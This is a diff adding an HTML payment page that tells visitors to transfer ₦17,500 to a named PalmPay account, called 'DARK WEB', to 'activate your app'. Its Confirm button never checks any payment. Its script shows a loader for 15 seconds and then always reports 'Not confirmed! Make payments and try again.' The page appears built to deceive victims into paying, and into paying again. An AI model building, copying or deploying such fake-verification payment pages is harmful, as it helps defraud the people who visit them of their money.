@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Pay</title>
+      <style>
+      @import url('https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap');
+    </style>
+  <style>
+    body {
+      background: #1d005e;
+      color: black;
+      font-family: "Poppins", sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    .back-arrow {
+      color: white;
+      font-size: 24px;
+      padding: 15px;
+      display: block;
+      text-decoration: none;
+    }
+
+    .container {
+      background: linear-gradient(to right, #b78aff, #ffb3c1);
+      width: 60%;
+      height: 50%;
+      border-radius: 10px;
+      text-align: center;
+      padding: 5px;
+      margin: 30px auto;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+    }
+
+    h1 {
+      font-size: 16px;
+    }
+
+    p {
+      font-size: 14px;
+      padding: 5px;
+    }
+
+    span {
+      color: #4b2a7b;
+      font-weight: bold;
+    }
+
+    button {
+      background: #804141;
+      color: white;
+      font-family: "Poppins", sans-serif;
+      border: none;
+      padding: 7px;
+      width: 95%;
+      font-size: 14px;
+      margin-bottom: 4px;
+      border-radius: 7px;
+    }
+
+    img {
+      width: 100px;
+      height: 50px;
+    }
+
+    .overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.5);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+
+    .popup {
+      background: white;
+      padding: 20px;
+      width: 85%;
+      max-width: 330px;
+      border-radius: 12px;
+      position: relative;
+      box-shadow: 0 8px 25px rgba(0,0,0,0.2);
+    }
+
+    .popup h1 {
+      font-size: 18px;
+      margin-bottom: 10px;
+    }
+
+    .popup p {
+      font-size: 14px;
+      margin: 6px 0;
+    }
+
+    .popup p span {
+      float: right;
+      font-weight: bold;
+      color: #4b2a7b;
+    }
+
+    .copy-icon {
+      font-size: 16px;
+      color: #4b2a7b;
+      margin-left: 8px;
+    }
+
+    .close-btn {
+      position: absolute;
+      text-align: right;
+      right: 16px;
+      top: 1px;
+      font-size: 24px;
+      background: none;
+      color: #999;
+      border: none;
+    }
+
+    .confirm-btn {
+      width: 100%;
+      margin-top: 15px;
+    }
+
+    .dot-loader {
+      text-align: center;
+      margin-top: 15px;
+      display: none;
+    }
+
+    .dot-loader span {
+      display: inline-block;
+      width: 10px;
+      height: 10px;
+      margin: 0 3px;
+      background: #4b2a7b;
+      border-radius: 50%;
+      animation: bounce 1.2s infinite ease-in-out both;
+    }
+
+    .dot-loader span:nth-child(1) { animation-delay: -0.3s; }
+    .dot-loader span:nth-child(2) { animation-delay: -0.15s; }
+    .dot-loader span:nth-child(3) { animation-delay: 0; }
+
+    @keyframes bounce {
+      0%, 80%, 100% { transform: scale(0); }
+      40% { transform: scale(1); }
+    }
+
+    .error-msg {
+      text-align: center;
+      color: red;
+      font-weight: bold;
+      margin-top: 20px;
+      display: none;
+    }
+
+    .divider {
+      height: 1px;
+      background-color: #d1d1d1;
+      margin: 10px 0;
+      opacity: 0.5;
+    }
+
+    .toast {
+      visibility: hidden;
+      min-width: 180px;
+      background-color: #4b2a7b;
+      color: #fff;
+      text-align: center;
+      border-radius: 6px;
+      padding: 10px;
+      position: fixed;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 2000;
+      font-size: 13px;
+      opacity: 0;
+      transition: opacity 0.4s ease, bottom 0.4s ease;
+    }
+
+    .toast.show {
+      visibility: visible;
+      opacity: 1;
+      bottom: 50px;
+    }
+  </style>
+</head>
+<body>
+
+<a href="amount.html" class="back-arrow">&larr;</a>
+
+<div class="container">
+  <img src="IMG_3661.png" alt="" />
+  <h1>Continue To Purchase</h1>
+  <p>Deposited: <span>N0</span></p>
+  <p>Total: <span>₦17,500</span></p>
+  <br />
+  <button onclick="showPopup()">Proceed</button>
+  <br />
+</div>
+
+<!-- Popup -->
+<div class="overlay" id="popup">
+  <div class="popup">
+    <button class="close-btn" onclick="closePopup()">×</button>
+    <br />
+    <h1>Confirm Transaction</h1>
+    <p>Make a quick transfer of ₦17,500 to the account below to activate your app.</p>
+
+    <div class="divider"></div>
+
+    <p>
+      Acc Number:
+      <span id="account-number">7059405760</span>
+      <span class="copy-icon" onclick="copyAccountNumber()">📋</span>
+    </p>
+    <p>Acc Name: <span>DARK WEB</span></p>
+    <p>Bank: <span>PalmPay</span></p>
+
+    <button id="confirmBtn" class="confirm-btn" onclick="confirmPopup()">Confirm</button>
+
+    <div class="dot-loader" id="loader">
+      <span></span><span></span><span></span>
+    </div>
+
+    <div class="error-msg" id="error-text">❌ Not confirmed! Make payments and try again.</div>
+  </div>
+</div>
+
+<!-- Toast Notification -->
+<div id="toast" class="toast">Account number copied</div>
+
+<script>
+  function showPopup() {
+    document.getElementById("popup").style.display = "flex";
+    document.getElementById("confirmBtn").style.display = "block";
+    document.getElementById("loader").style.display = "none";
+    document.getElementById("error-text").style.display = "none";
+  }
+
+  function closePopup() {
+    document.getElementById("popup").style.display = "none";
+  }
+
+  function confirmPopup() {
+    document.getElementById("confirmBtn").style.display = "none";
+    document.getElementById("loader").style.display = "block";
+    document.getElementById("error-text").style.display = "none";
+
+    setTimeout(() => {
+      document.getElementById("loader").style.display = "none";
+      document.getElementById("error-text").style.display = "block";
+    }, 15000);
+  }
+
+  function copyAccountNumber() {
+    const number = document.getElementById("account-number").textContent;
+    navigator.clipboard.writeText(number).then(() => {
+      const toast = document.getElementById("toast");
+      toast.classList.add("show");
+      setTimeout(() => {
+        toast.classList.remove("show");
+      }, 2500);
+    });
+  }
+</script>
+
+</body>
+</html>
